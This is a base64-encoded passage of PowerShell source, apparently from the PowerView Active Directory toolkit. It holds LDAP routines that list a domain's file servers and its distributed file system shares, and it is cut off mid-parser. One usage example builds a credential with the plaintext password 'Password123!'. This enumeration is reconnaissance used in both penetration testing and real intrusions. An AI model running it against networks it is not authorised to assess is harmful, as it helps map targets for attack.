ICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGZ1bmN0aW9uIFNwbGl0LVBhdGggewogICAgICAgICAgICAjIHNob3J0IGludGVybmFsIGhlbHBlciB0byBzcGxpdCBVTkMgc2VydmVyIHBhdGhzCiAgICAgICAgICAgIFBhcmFtKFtTdHJpbmddJFBhdGgpCgogICAgICAgICAgICBpZiAoJFBhdGggLWFuZCAoJFBhdGguc3BsaXQoJ1xcJykuQ291bnQgLWdlIDMpKSB7CiAgICAgICAgICAgICAgICAkVGVtcCA9ICRQYXRoLnNwbGl0KCdcXCcpWzJdCiAgICAgICAgICAgICAgICBpZiAoJFRlbXAgLWFuZCAoJFRlbXAgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICRUZW1wCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdMREFQRmlsdGVyJyA9ICcoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIpKSh8KGhvbWVkaXJlY3Rvcnk9Kikoc2NyaXB0cGF0aD0qKShwcm9maWxlcGF0aD0qKSkpJwogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnaG9tZWRpcmVjdG9yeSxzY3JpcHRwYXRoLHByb2ZpbGVwYXRoJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldERvbWFpbiBpbiAkRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFRhcmdldERvbWFpbgogICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICMgZ2V0IGFsbCByZXN1bHRzIHcvbyB0aGUgcGlwZWxpbmUgYW5kIHVuaXF1aWZ5IHRoZW0gKEkga25vdyBpdCdzIG5vdCBwcmV0dHkpCiAgICAgICAgICAgICAgICAkKEZvckVhY2goJFVzZXJSZXN1bHQgaW4gJFVzZXJTZWFyY2hlci5GaW5kQWxsKCkpIHtpZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snaG9tZWRpcmVjdG9yeSddKSB7U3BsaXQtUGF0aCgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pfWlmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydzY3JpcHRwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pfX0pIHwgU29ydC1PYmplY3QgLVVuaXF1ZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVXNlclNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAkKEZvckVhY2goJFVzZXJSZXN1bHQgaW4gJFVzZXJTZWFyY2hlci5GaW5kQWxsKCkpIHtpZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snaG9tZWRpcmVjdG9yeSddKSB7U3BsaXQtUGF0aCgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pfWlmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydzY3JpcHRwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pfX0pIHwgU29ydC1PYmplY3QgLVVuaXF1ZQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5ERlNTaGFyZSB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBhIGxpc3Qgb2YgYWxsIGZhdWx0LXRvbGVyYW50IGRpc3RyaWJ1dGVkIGZpbGUgc3lzdGVtcwpmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKQXV0aG9yOiBCZW4gQ2FtcGJlbGwgKEBtZWF0YmFsbHNfXykgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5TZWFyY2hlciAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gc2VhcmNoZXMgZm9yIGFsbCBkaXN0cmlidXRlZCBmaWxlIHN5c3RlbXMgKGVpdGhlciB2ZXJzaW9uCjEsIDIsIG9yIGJvdGggZGVwZW5kaW5nIG9uIC1WZXJzaW9uIFgpIGJ5IHNlYXJjaGluZyBmb3IgZG9tYWluIG9iamVjdHMKbWF0Y2hpbmcgKG9iamVjdENsYXNzPWZURGZzKSBvciAob2JqZWN0Q2xhc3M9bXNERlMtTGlua3YyKSwgcmVzcGVjdGl2ZWx5ClRoZSBzZXJ2ZXIgZGF0YSBpcyBwYXJzZWQgYXBwcm9wcmlhdGVseSBhbmQgcmV0dXJuZWQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkRGU1NoYXJlCgpSZXR1cm5zIGFsbCBkaXN0cmlidXRlZCBmaWxlIHN5c3RlbSBzaGFyZXMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluREZTU2hhcmUgLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIGFsbCBkaXN0cmlidXRlZCBmaWxlIHN5c3RlbSBzaGFyZXMgZm9yIHRoZSAndGVzdGxhYi5sb2NhbCcgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5ERlNTaGFyZSAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QKCkEgY3VzdG9tIFBTT2JqZWN0IGRlc2NyaWJpbmcgdGhlIGRpc3RyaWJ1dGVkIGZpbGUgc3lzdGVtcy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZUFwcHJvdmVkVmVyYnMnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbk5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FsbCcsICdWMScsICcxJywgJ1YyJywgJzInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRWZXJzaW9uID0gJ0FsbCcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBmdW5jdGlvbiBQYXJzZS1Qa3QgewogICAgICAgICAgICBbQ21kbGV0QmluZGluZygpXQogICAgICAgICAgICBQYXJhbSgKICAgICAgICAgICAgICAgIFtCeXRlW11dCiAgICAgICAgICAgICAgICAkUGt0CiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRiaW4gPSAkUGt0CiAgICAgICAgICAgICRibG9iX3ZlcnNpb24gPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJpblswLi4zXSwwKQogICAgICAgICAgICAkYmxvYl9lbGVtZW50X2NvdW50ID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRiaW5bNC4uN10sMCkKICAgICAgICAgICAgJG9mZnNldCA9IDgKICAgICAgICAgICAgI2h0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvY2MyMjcxNDcuYXNweAogICAgICAgICAgICAkb2JqZWN0X2xpc3QgPSBAKCkKICAgICAgICAgICAgZm9yKCRpPTE7ICRpIC1sZSAkYmxvYl9lbGVtZW50X2NvdW50OyAkaSsrKXsKICAgICAgICAgICAgICAgICRibG9iX25hbWVfc2l6ZV9zdGFydCA9ICRvZmZzZXQKICAgICAgICAgICAgICAgICRibG9iX25hbWVfc2l6ZV9lbmQgPSAkb2Zmc2V0ICsgMQogICAgICAgICAgICAgICAgJGJsb2JfbmFtZV9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDE2KCRiaW5bJGJsb2JfbmFtZV9zaXplX3N0YXJ0Li4kYmxvYl9uYW1lX3NpemVfZW5kXSwwKQoKICAgICAgICAgICAgICAgICRibG9iX25hbWVfc3RhcnQgPSAkYmxvYl9uYW1lX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgJGJsb2JfbmFtZV9lbmQgPSAkYmxvYl9uYW1lX3N0YXJ0ICsgJGJsb2JfbmFtZV9zaXplIC0gMQogICAgICAgICAgICAgICAgJGJsb2JfbmFtZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRiaW5bJGJsb2JfbmFtZV9zdGFydC4uJGJsb2JfbmFtZV9lbmRdKQoKICAgICAgICAgICAgICAgICRibG9iX2RhdGFfc2l6ZV9zdGFydCA9ICRibG9iX25hbWVfZW5kICsgMQogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9zaXplX2VuZCA9ICRibG9iX2RhdGFfc2l6ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICRibG9iX2RhdGFfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkYmluWyRibG9iX2RhdGFfc2l6ZV9zdGFydC4uJGJsb2JfZGF0YV9zaXplX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAkYmxvYl9kYXRhX3N0YXJ0ID0gJGJsb2JfZGF0YV9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICRibG9iX2RhdGFfZW5kID0gJGJsb2JfZGF0YV9zdGFydCArICRibG9iX2RhdGFfc2l6ZSAtIDEKICAgICAgICAgICAgICAgICRibG9iX2RhdGEgPSAkYmluWyRibG9iX2RhdGFfc3RhcnQuLiRibG9iX2RhdGFfZW5kXQogICAgICAgICAgICAgICAgc3dpdGNoIC13aWxkY2FyZCAoJGJsb2JfbmFtZSkgewogICAgICAgICAgICAgICAgICAgICJcc2l0ZXJvb3QiIHsgIH0KICAgICAgICAgICAgICAgICAgICAiXGRvbWFpbnJvb3QqIiB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgUGFyc2UgREZTTmFtZXNwYWNlUm9vdE9yTGlua0Jsb2Igb2JqZWN0LiBTdGFydHMgd2l0aCB2YXJpYWJsZSBsZW5ndGggREZTUm9vdE9yTGlua0lEQmxvYiB3aGljaCB3ZSBwYXJzZSBmaXJzdC4uLgogICAgICAgICAgICAgICAgICAgICAgICAjIERGU1Jvb3RPckxpbmtJREJsb2IKICAgICAgICAgICAgICAgICAgICAgICAgJHJvb3Rfb3JfbGlua19ndWlkX3N0YXJ0ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAkcm9vdF9vcl9saW5rX2d1aWRfZW5kID0gMTUKICAgICAgICAgICAgICAgICAgICAgICAgJHJvb3Rfb3JfbGlua19ndWlkID0gW2J5dGVbXV0kYmxvYl9kYXRhWyRyb290X29yX2xpbmtfZ3VpZF9zdGFydC4uJHJvb3Rfb3JfbGlua19ndWlkX2VuZF0KICAgICAgICAgICAgICAgICAgICAgICAgJGd1aWQgPSBOZXctT2JqZWN0IEd1aWQoLCRyb290X29yX2xpbmtfZ3VpZCkgIyBzaG91bGQgbWF0Y2ggJGd1aWRfc3RyCiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfc2l6ZV9zdGFydCA9ICRyb290X29yX2xpbmtfZ3VpZF9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfc2l6ZV9lbmQgPSAkcHJlZml4X3NpemVfc3RhcnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkYmxvYl9kYXRhWyRwcmVmaXhfc2l6ZV9zdGFydC4uJHByZWZpeF9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zdGFydCA9ICRwcmVmaXhfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfZW5kID0gJHByZWZpeF9zdGFydCArICRwcmVmaXhfc2l6ZSAtIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRibG9iX2RhdGFbJHByZWZpeF9zdGFydC4uJHByZWZpeF9lbmRdKQoKICAgICAgICAgICAgICAgICAgICAgICAgJHNob3J0X3ByZWZpeF9zaXplX3N0YXJ0ID0gJHByZWZpeF9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRzaG9ydF9wcmVmaXhfc2l6ZV9lbmQgPSAkc2hvcnRfcHJlZml4X3NpemVfc3RhcnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRzaG9ydF9wcmVmaXhfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkYmxvYl9kYXRhWyRzaG9ydF9wcmVmaXhfc2l6ZV9zdGFydC4uJHNob3J0X3ByZWZpeF9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJHNob3J0X3ByZWZpeF9zdGFydCA9ICRzaG9ydF9wcmVmaXhfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRzaG9ydF9wcmVmaXhfZW5kID0gJHNob3J0X3ByZWZpeF9zdGFydCArICRzaG9ydF9wcmVmaXhfc2l6ZSAtIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHNob3J0X3ByZWZpeCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRibG9iX2RhdGFbJHNob3J0X3ByZWZpeF9zdGFydC4uJHNob3J0X3ByZWZpeF9lbmRdKQoKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGVfc3RhcnQgPSAkc2hvcnRfcHJlZml4X2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGVfZW5kID0gJHR5cGVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICR0eXBlID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJHR5cGVfc3RhcnQuLiR0eXBlX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0ZV9zdGFydCA9ICR0eXBlX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlX2VuZCA9ICRzdGF0ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJHN0YXRlX3N0YXJ0Li4kc3RhdGVfZW5kXSwwKQoKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfc2l6ZV9zdGFydCA9ICRzdGF0ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3NpemVfZW5kID0gJGNvbW1lbnRfc2l6ZV9zdGFydCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkYmxvYl9kYXRhWyRjb21tZW50X3NpemVfc3RhcnQuLiRjb21tZW50X3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF9zdGFydCA9ICRjb21tZW50X3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF9lbmQgPSAkY29tbWVudF9zdGFydCArICRjb21tZW50X3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkY29tbWVudF9zaXplIC1ndCAwKSAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkYmxvYl9kYXRhWyRjb21tZW50X3N0YXJ0Li4kY29tbWVudF9lbmRdKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfdGltZXN0YW1wX3N0YXJ0ID0gJGNvbW1lbnRfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4X3RpbWVzdGFtcF9lbmQgPSAkcHJlZml4X3RpbWVzdGFtcF9zdGFydCArIDcKICAgICAgICAgICAgICAgICAgICAgICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjMjMwMzI0LmFzcHggRklMRVRJTUUKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF90aW1lc3RhbXAgPSAkYmxvYl9kYXRhWyRwcmVmaXhfdGltZXN0YW1wX3N0YXJ0Li4kcHJlZml4X3RpbWVzdGFtcF9lbmRdICNkd29yZCBsb3dEYXRlVGltZSAjZHdvcmQgaGlnaGRhdGV0aW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0ZV90aW1lc3RhbXBfc3RhcnQgPSAkcHJlZml4X3RpbWVzdGFtcF9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0ZV90aW1lc3RhbXBfZW5kID0gJHN0YXRlX3RpbWVzdGFtcF9zdGFydCArIDcKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlX3RpbWVzdGFtcCA9ICRibG9iX2RhdGFbJHN0YXRlX3RpbWVzdGFtcF9zdGFydC4uJHN0YXRlX3RpbWVzdGFtcF9lbmRdCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3RpbWVzdGFtcF9zdGFydCA9ICRzdGF0ZV90aW1lc3RhbXBfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF90aW1lc3RhbXBfZW5kID0gJGNvbW1lbnRfdGltZXN0YW1wX3N0YXJ0ICsgNwogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF90aW1lc3RhbXAgPSAkYmxvYl9kYXRhWyRjb21tZW50X3RpbWVzdGFtcF9zdGFydC4uJGNvbW1lbnRfdGltZXN0YW1wX2VuZF0KICAgICAgICAgICAgICAgICAg